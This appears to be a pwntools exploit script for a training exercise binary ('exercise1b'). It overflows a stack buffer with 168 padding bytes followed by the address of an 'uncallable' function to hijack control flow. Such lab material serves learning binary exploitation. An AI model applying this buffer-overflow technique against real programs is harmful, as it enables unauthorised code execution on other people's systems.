#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import binascii

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise1b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
	'''Start the exploit against the target.'''
	if args.GDB:
		return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
	else:
		return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

e = ELF(exe)
#print(type(e.symbols['uncallable']))
addr = e.symbols['uncallable'].to_bytes(8, byteorder='little')
#print(addr)
#uncallable_addr = b'\xba\x11\x40\x00'
top_of_stack = b'A' * 168 + addr#uncallable_addr 

r = start()
out_0 = r.recvline()
r.sendline(top_of_stack)
out = r.recvall()
print(out)
